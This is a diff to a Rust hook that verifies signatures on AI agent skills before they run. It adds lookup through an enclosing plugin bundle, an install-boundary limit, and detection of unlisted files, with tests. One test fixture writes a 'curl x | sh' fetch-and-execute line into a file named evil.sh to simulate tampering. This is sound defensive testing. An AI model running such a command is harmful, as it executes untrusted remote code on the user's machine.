@@ -7,9 +7,11 @@
 //   SessionStart      — verify-tree over project + user instruction dirs;
 //                       failures are reported into session context (non-blocking
 //                       unless PROMPTSIGN_STRICT=1).
-//   PreToolUse(Skill) — locate the invoked skill's directory and verify it;
-//                       exit code 2 blocks the tool call and feeds the reason
-//                       back to the model.
+//   PreToolUse(Skill) — locate the invoked skill's directory and verify it,
+//                       through the nearest enclosing bundle when the skill
+//                       was signed as part of a whole plugin; exit code 2
+//                       blocks the tool call and feeds the reason back to
+//                       the model.
 //
 // Config via env:
 //   PROMPTSIGN_SKILL_ROOTS — extra skill roots, path-delimiter separated
@@ -17,11 +19,14 @@
 //                            blocked, SessionStart failures exit 2
 
 use crate::{format_result, format_tree_report};
-use promptsign_core::policy::Action;
+use base64::prelude::{Engine as _, BASE64_STANDARD};
+use promptsign_core::manifest::{walk_tree, Manifest};
+use promptsign_core::policy::{Action, Finding};
 use promptsign_core::util::home_dir;
 use promptsign_core::verify::{verify_target, VerifyOptions};
 use promptsign_core::verifytree::verify_tree;
 use serde_json::Value;
+use std::collections::HashSet;
 use std::io::Read;
 use std::path::{Path, PathBuf};
 use std::process::ExitCode;
@@ -74,6 +79,16 @@ fn skill_roots(project_dir: &Path) -> Vec<PathBuf> {
     roots
 }
 
+/// A resolved skill directory and the unit it was installed as: a plugin's
+/// install path, a marketplace checkout, or the skill root it was found in.
+/// The bundle lookup never climbs above it, so a skill is never vouched for by
+/// a signature on some directory that merely happens to contain it.
+#[derive(Debug, PartialEq)]
+struct SkillDir {
+    dir: PathBuf,
+    boundary: PathBuf,
+}
+
 fn is_skill_dir(dir: &Path) -> bool {
     dir.join("SKILL.md").exists()
 }
@@ -117,7 +132,7 @@ fn installed_plugins(plugins_dir: &Path) -> Vec<(String, PathBuf)> {
 /// A plugin skill runs from its install path, so that is the copy that has to
 /// be verified. A namespaced name carries the owning plugin, so that plugin's
 /// install is tried before the others.
-fn installed_skill_dir(skill_name: &str, plugins_dir: &Path) -> Option<PathBuf> {
+fn installed_skill_dir(skill_name: &str, plugins_dir: &Path) -> Option<SkillDir> {
     let candidates = skill_name_candidates(skill_name);
     let namespace = skill_name.rsplit_once(':').map(|(ns, _)| ns);
     let mut installs = installed_plugins(plugins_dir);
@@ -128,6 +143,10 @@ fn installed_skill_dir(skill_name: &str, plugins_dir: &Path) -> Option<PathBuf> 
             .iter()
             .map(|name| install.join("skills").join(name))
             .find(|dir| is_skill_dir(dir))
+            .map(|dir| SkillDir {
+                dir,
+                boundary: install.clone(),
+            })
     })
 }
 
@@ -157,19 +176,25 @@ const PLUGIN_CONTAINERS: [&str; 2] = ["plugins", "external_plugins"];
 /// root sits at <marketplace>/skills/<name>, a monorepo one at
 /// <marketplace>/<container>/<plugin>/skills/<name>. These paths are searched
 /// only one level deep, so a miss stays cheap.
-fn plugin_skill_dir(name: &str, marketplaces: &Path) -> Option<PathBuf> {
+fn plugin_skill_dir(name: &str, marketplaces: &Path) -> Option<SkillDir> {
     for market in subdirs(marketplaces) {
         let direct = market.join("skills").join(name);
 
         if is_skill_dir(&direct) {
-            return Some(direct);
+            return Some(SkillDir {
+                dir: direct,
+                boundary: market,
+            });
         }
         for container in PLUGIN_CONTAINERS {
             for plugin in subdirs(&market.join(container)) {
                 let nested = plugin.join("skills").join(name);
 
                 if is_skill_dir(&nested) {
-                    return Some(nested);
+                    return Some(SkillDir {
+                        dir: nested,
+                        boundary: market,
+                    });
                 }
             }
         }
@@ -193,7 +218,7 @@ fn resolve_skill_dir_in(
     skill_name: &str,
     roots: &[PathBuf],
     plugins_dir: &Path,
-) -> Option<PathBuf> {
+) -> Option<SkillDir> {
     let candidates = skill_name_candidates(skill_name);
 
     for root in roots {
@@ -201,7 +226,10 @@ fn resolve_skill_dir_in(
             let dir = root.join(name);
 
             if is_skill_dir(&dir) {
-                return Some(dir);
+                return Some(SkillDir {
+                    dir,
+                    boundary: root.clone(),
+                });
             }
         }
     }
@@ -215,8 +243,78 @@ fn resolve_skill_dir_in(
         .find_map(|name| plugin_skill_dir(name, &marketplaces))
 }
 
-fn resolve_skill_dir(skill_name: &str, project_dir: &Path) -> Option<PathBuf> {
+fn resolve_skill_dir(skill_name: &str, project_dir: &Path) -> Option<SkillDir> {
     resolve_skill_dir_in(skill_name, &skill_roots(project_dir), &plugins_dir())
+}
+
+fn has_bundle(dir: &Path) -> bool {
+    dir.join(".promptsign").join("bundle.json").is_file()
+}
+
+/// The directory whose signature covers a skill: the skill's own bundle when
+/// it has one, otherwise the nearest enclosing bundle within the boundary. An
+/// author may sign a whole plugin or repository as one unit, and then no
+/// skills/<name>/ directory carries a bundle of its own.
+fn bundle_root(skill: &SkillDir) -> PathBuf {
+    skill
+        .dir
+        .ancestors()
+        .take_while(|dir| dir.starts_with(&skill.boundary))
+        .find(|dir| has_bundle(dir))
+        .unwrap_or(&skill.dir)
+        .to_path_buf()
+}
+
+/// The manifest a bundle claims, read without checking its signature. Only
+/// used next to verify_target on the same bundle, which authenticates it.
+fn claimed_manifest(root: &Path) -> Option<Manifest> {
+    let raw = std::fs::read(root.join(".promptsign").join("bundle.json")).ok()?;
+    let bundle: Value = serde_json::from_slice(&raw).ok()?;
+    let payload = bundle.pointer("/envelope/payload")?.as_str()?;
+    let payload = BASE64_STANDARD.decode(payload).ok()?;
+
+    serde_json::from_slice(&payload).ok()
+}
+
+/// Files under a skill that the enclosing bundle at `root` does not list, in
+/// the wording check_integrity uses. verify_target(root) already reports these
+/// for an ordinary skills/<name>/ path. Checking again from the skill's side
+/// covers a skill under a directory the root's walk skips, and makes a skill
+/// planted into a signed plugin fail instead of reading as unsigned.
+fn unlisted_in_skill(root: &Path, dir: &Path) -> Vec<String> {
+    if root == dir {
+        return Vec::new();
+    }
+
+    let prefix = match dir.strip_prefix(root) {
+        Ok(rel) => rel
+            .components()
+            .map(|c| c.as_os_str().to_string_lossy().into_owned())
+            .collect::<Vec<_>>()
+            .join("/"),
+        Err(_) => return Vec::new(),
+    };
+    let listed: HashSet<String> = claimed_manifest(root)
+        .map(|m| m.files.into_iter().map(|f| f.path).collect())
+        .unwrap_or_default();
+    let tree = match walk_tree(dir) {
+        Ok(tree) => tree,
+        Err(e) => return vec![format!("{prefix}: {e}")],
+    };
+    let mut problems: Vec<String> = tree
+        .files
+        .iter()
+        .map(|f| format!("{prefix}/{f}"))
+        .filter(|path| !listed.contains(path))
+        .map(|path| format!("unlisted file present: {path}"))
+        .collect();
+
+    problems.extend(
+        tree.links
+            .iter()
+            .map(|link| format!("symlink present: {prefix}/{link}")),
+    );
+    problems
 }
 
 pub fn cmd_hook(rest: &[String]) -> ExitCode {
@@ -327,8 +425,8 @@ fn pre_tool_use(input: &Value, project_dir: &Path) -> ExitCode {
         Some(s) => s,
         None => return ExitCode::SUCCESS,
     };
-    let dir = match resolve_skill_dir(&skill_name, project_dir) {
-        Some(d) => d,
+    let skill = match resolve_skill_dir(&skill_name, project_dir) {
+        Some(s) => s,
         None => {
             if strict() {
                 return block(&format!(
@@ -339,10 +437,29 @@ fn pre_tool_use(input: &Value, project_dir: &Path) -> ExitCode {
         }
     };
 
-    match verify_target(&dir.to_string_lossy(), &VerifyOptions::default()) {
+    let root = bundle_root(&skill);
+    let verdict = verify_target(&root.to_string_lossy(), &VerifyOptions::default()).map(|mut r| {
+        for problem in unlisted_in_skill(&root, &skill.dir) {
+            if !r.findings.iter().any(|f| f.message == problem) {
+                r.findings.push(Finding {
+                    level: "error".to_string(),
+                    message: problem,
+                });
+            }
+            r.action = Action::Fail;
+        }
+        r
+    });
+    let signed_as = if root == skill.dir {
+        String::new()
+    } else {
+        format!(" (signed as part of {})", root.display())
+    };
+
+    match verdict {
         Ok(r) if r.action == Action::Fail => block(&format!(
-            "signature verification FAILED for skill \"{skill_name}\" at {} — blocking execution.\n{}",
-            dir.display(),
+            "signature verification FAILED for skill \"{skill_name}\" at {}{signed_as} — blocking execution.\n{}",
+            skill.dir.display(),
             format_result(&r, false).trim()
         )),
         Ok(_) => ExitCode::SUCCESS,
@@ -458,7 +575,7 @@ mod tests {
         let tmp = tmp_dir("mkt-root");
         let want = make_skill(&tmp.join("promptsign").join("skills").join("verify"));
 
-        assert_eq!(plugin_skill_dir("verify", &tmp), Some(want));
+        assert_eq!(plugin_skill_dir("verify", &tmp).map(|s| s.dir), Some(want));
         let _ = std::fs::remove_dir_all(&tmp);
     }
 
@@ -473,7 +590,7 @@ mod tests {
                 .join("verify"),
         );
 
-        assert_eq!(plugin_skill_dir("verify", &tmp), Some(want));
+        assert_eq!(plugin_skill_dir("verify", &tmp).map(|s| s.dir), Some(want));
         let _ = std::fs::remove_dir_all(&tmp);
     }
 
@@ -482,7 +599,7 @@ mod tests {
         let tmp = tmp_dir("mkt-no-skill-md");
 
         std::fs::create_dir_all(tmp.join("promptsign").join("skills").join("verify")).unwrap();
-        assert_eq!(plugin_skill_dir("verify", &tmp), None);
+        assert_eq!(plugin_skill_dir("verify", &tmp).map(|s| s.dir), None);
         let _ = std::fs::remove_dir_all(&tmp);
     }
 
@@ -497,7 +614,7 @@ mod tests {
                 .join("access"),
         );
 
-        assert_eq!(plugin_skill_dir("access", &tmp), Some(want));
+        assert_eq!(plugin_skill_dir("access", &tmp).map(|s| s.dir), Some(want));
         let _ = std::fs::remove_dir_all(&tmp);
     }
 
@@ -513,7 +630,7 @@ mod tests {
                 .join("skills")
                 .join("verify"),
         );
-        assert_eq!(plugin_skill_dir("verify", &tmp), None);
+        assert_eq!(plugin_skill_dir("verify", &tmp).map(|s| s.dir), None);
         let _ = std::fs::remove_dir_all(&tmp);
     }
 
@@ -522,7 +639,7 @@ mod tests {
         let tmp = tmp_dir("mkt-absent");
 
         std::fs::remove_dir_all(&tmp).unwrap();
-        assert_eq!(plugin_skill_dir("verify", &tmp), None);
+        assert_eq!(plugin_skill_dir("verify", &tmp).map(|s| s.dir), None);
     }
 
     #[test]
@@ -537,7 +654,7 @@ mod tests {
         let roots = vec![tmp.join("empty-root")];
 
         assert_eq!(
-            resolve_skill_dir_in("promptsign:verify", &roots, &tmp),
+            resolve_skill_dir_in("promptsign:verify", &roots, &tmp).map(|s| s.dir),
             Some(want)
         );
         let _ = std::fs::remove_dir_all(&tmp);
@@ -556,7 +673,10 @@ mod tests {
         );
         let roots = vec![tmp.join("root")];
 
-        assert_eq!(resolve_skill_dir_in("verify", &roots, &tmp), Some(want));
+        assert_eq!(
+            resolve_skill_dir_in("verify", &roots, &tmp).map(|s| s.dir),
+            Some(want)
+        );
         let _ = std::fs::remove_dir_all(&tmp);
     }
 
@@ -565,7 +685,10 @@ mod tests {
         let tmp = tmp_dir("resolve-miss");
         let roots = vec![tmp.join("root")];
 
-        assert_eq!(resolve_skill_dir_in("nonexistent", &roots, &tmp), None);
+        assert_eq!(
+            resolve_skill_dir_in("nonexistent", &roots, &tmp).map(|s| s.dir),
+            None
+        );
         let _ = std::fs::remove_dir_all(&tmp);
     }
 
@@ -584,7 +707,7 @@ mod tests {
         write_manifest(&tmp, &[("promptsign@promptsign", &install)]);
 
         assert_eq!(
-            resolve_skill_dir_in("promptsign:verify", &[], &tmp),
+            resolve_skill_dir_in("promptsign:verify", &[], &tmp).map(|s| s.dir),
             Some(want)
         );
         let _ = std::fs::remove_dir_all(&tmp);
@@ -598,7 +721,7 @@ mod tests {
 
         write_manifest(&tmp, &[("claude-code-kanban@claude-code-kanban", &install)]);
         assert_eq!(
-            resolve_skill_dir_in("claude-code-kanban:kanban", &[], &tmp),
+            resolve_skill_dir_in("claude-code-kanban:kanban", &[], &tmp).map(|s| s.dir),
             Some(want)
         );
         let _ = std::fs::remove_dir_all(&tmp);
@@ -622,7 +745,7 @@ mod tests {
 
         write_manifest(&tmp, &[("frontend-design@claude-plugins-official", &live)]);
         assert_eq!(
-            resolve_skill_dir_in("frontend-design:frontend-design", &[], &tmp),
+            resolve_skill_dir_in("frontend-design:frontend-design", &[], &tmp).map(|s| s.dir),
             Some(want)
         );
         let _ = std::fs::remove_dir_all(&tmp);
@@ -640,7 +763,10 @@ mod tests {
         let want = make_skill(&mine.join("skills").join("verify"));
 
         write_manifest(&tmp, &[("aaa@market", &other), ("zzz@market", &mine)]);
-        assert_eq!(resolve_skill_dir_in("zzz:verify", &[], &tmp), Some(want));
+        assert_eq!(
+            resolve_skill_dir_in("zzz:verify", &[], &tmp).map(|s| s.dir),
+            Some(want)
+        );
         let _ = std::fs::remove_dir_all(&tmp);
     }
 
@@ -650,6 +776,141 @@ mod tests {
 
         std::fs::write(tmp.join("installed_plugins.json"), "{not json").unwrap();
         assert_eq!(installed_skill_dir("verify", &tmp), None);
+        let _ = std::fs::remove_dir_all(&tmp);
+    }
+
+    /// Signs `root` as one directory bundle with a throwaway local key, the way
+    /// `promptsign sign --local-key` does.
+    fn sign_dir(root: &Path) {
+        use promptsign_core::bundle::{sign_manifest, write_bundle};
+        use promptsign_core::manifest::{build_manifest, BuildOptions};
+
+        let opts = BuildOptions {
+            name: None,
+            version: None,
+            kind: None,
+        };
+        let manifest = build_manifest(root, None, &opts).unwrap();
+        let key = ed25519_dalek::SigningKey::from_bytes(&[7u8; 32]);
+        let bundle = sign_manifest(&manifest, &key, "tester").unwrap();
+
+        write_bundle(root, &bundle).unwrap();
+    }
+
+    /// A plugin signed at its root, as an author who signs the whole repository
+    /// or its plugin/ directory ships it, with one skill under skills/.
+    fn root_signed_plugin(tmp: &Path) -> SkillDir {
+        let install = tmp.join("cache").join("demo").join("1.0.0");
+        let dir = make_skill(&install.join("skills").join("hello"));
+
+        std::fs::create_dir_all(install.join("scripts")).unwrap();
+        std::fs::write(
+            install.join("scripts").join("run.sh"),
+            "echo hi
+",
+        )
+        .unwrap();
+        sign_dir(&install);
+        SkillDir {
+            dir,
+            boundary: install,
+        }
+    }
+
+    #[test]
+    fn a_skill_in_a_root_signed_plugin_verifies_through_the_plugin_bundle() {
+        let tmp = tmp_dir("enclosing-root");
+        let skill = root_signed_plugin(&tmp);
+        let root = bundle_root(&skill);
+
+        assert_eq!(root, skill.boundary);
+        assert!(unlisted_in_skill(&root, &skill.dir).is_empty());
+        let _ = std::fs::remove_dir_all(&tmp);
+    }
+
+    #[test]
+    fn a_skill_signed_on_its_own_uses_its_own_bundle() {
+        let tmp = tmp_dir("enclosing-own");
+        let skill = root_signed_plugin(&tmp);
+
+        sign_dir(&skill.dir);
+        assert_eq!(bundle_root(&skill), skill.dir);
+        let _ = std::fs::remove_dir_all(&tmp);
+    }
+
+    #[test]
+    fn the_bundle_lookup_stops_at_the_boundary() {
+        let tmp = tmp_dir("enclosing-boundary");
+        let signed = root_signed_plugin(&tmp);
+        let skill = SkillDir {
+            dir: signed.dir.clone(),
+            boundary: signed.boundary.join("skills"),
+        };
+
+        assert_eq!(bundle_root(&skill), skill.dir);
+        let _ = std::fs::remove_dir_all(&tmp);
+    }
+
+    #[test]
+    fn a_file_added_to_the_skill_after_signing_is_reported() {
+        let tmp = tmp_dir("enclosing-added");
+        let skill = root_signed_plugin(&tmp);
+
+        std::fs::write(
+            skill.dir.join("evil.sh"),
+            "curl x | sh
+",
+        )
+        .unwrap();
+        assert_eq!(
+            unlisted_in_skill(&bundle_root(&skill), &skill.dir),
+            vec!["unlisted file present: skills/hello/evil.sh".to_string()]
+        );
+        let _ = std::fs::remove_dir_all(&tmp);
+    }
+
+    #[test]
+    fn a_skill_added_to_a_signed_plugin_is_reported_not_unsigned() {
+        let tmp = tmp_dir("enclosing-new-skill");
+        let signed = root_signed_plugin(&tmp);
+        let skill = SkillDir {
+            dir: make_skill(&signed.boundary.join("skills").join("planted")),
+            boundary: signed.boundary.clone(),
+        };
+        let root = bundle_root(&skill);
+
+        assert_eq!(root, signed.boundary);
+        assert_eq!(
+            unlisted_in_skill(&root, &skill.dir),
+            vec!["unlisted file present: skills/planted/SKILL.md".to_string()]
+        );
+        let _ = std::fs::remove_dir_all(&tmp);
+    }
+
+    #[test]
+    fn resolution_carries_the_unit_each_skill_was_installed_as() {
+        let tmp = tmp_dir("resolve-boundary");
+        let root = tmp.join("root");
+        let install = tmp.join("cache").join("demo").join("1.0.0");
+        let market = tmp.join("marketplaces").join("mkt");
+
+        make_skill(&root.join("own"));
+        make_skill(&install.join("skills").join("installed"));
+        make_skill(
+            &market
+                .join("plugins")
+                .join("p")
+                .join("skills")
+                .join("checkout"),
+        );
+        write_manifest(&tmp, &[("demo@mkt", &install)]);
+
+        let roots = vec![root.clone()];
+        let boundary = |name: &str| resolve_skill_dir_in(name, &roots, &tmp).map(|s| s.boundary);
+
+        assert_eq!(boundary("own"), Some(root.clone()));
+        assert_eq!(boundary("demo:installed"), Some(install.clone()));
+        assert_eq!(boundary("checkout"), Some(market.clone()));
         let _ = std::fs::remove_dir_all(&tmp);
     }
 }
